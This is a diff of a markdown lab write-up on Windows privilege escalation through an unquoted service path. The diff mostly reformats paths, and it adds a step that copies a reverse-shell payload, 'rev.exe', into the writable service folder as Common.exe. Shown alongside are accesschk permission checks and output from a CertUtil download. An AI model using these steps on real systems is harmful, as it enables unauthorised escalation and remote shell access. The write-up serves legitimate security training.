@@ -160,7 +160,7 @@ C:\
   RW BUILTIN\Administrators
   RW NT AUTHORITY\SYSTEM
 ```
-No write access for normal users on C:\ — I needed to check deeper.
+No write access for normal users on `C:\` — I needed to check deeper.
 
 <p align="center">
   <img src="images/step1-2.png" width="600">
@@ -170,7 +170,7 @@ No write access for normal users on C:\ — I needed to check deeper.
 
 I checked each folder in the service path one by one.
 
-Check C:\Program Files\
+Check `C:\Program Files\`
 
 ```bash
 C:\PrivEsc>.\accesschk /accepteula -uwdq "C:\Program Files\"
@@ -191,7 +191,7 @@ No write access for normal users here either.
   <img src="images/step2-1.png" width="600">
 </p>
 
-Check C:\Program Files\Unquoted Path Service\
+Check `C:\Program Files\Unquoted Path Service\`
 
 ```bash
 C:\PrivEsc>.\accesschk /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
@@ -262,3 +262,16 @@ CertUtil: -URLCache command completed successfully.
 <p align="center">
   <img src="images/step3-2.png" width="600">
 </p>
+
+## Step 4 — Copying the Payload and Starting the Service
+
+Copied the Payload to the Writable Folder as Common.exe
+
+```bash
+copy C:\PrivEsc\rev.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+```
+**Output:**
+
+```
+1 file(s) copied.
+```
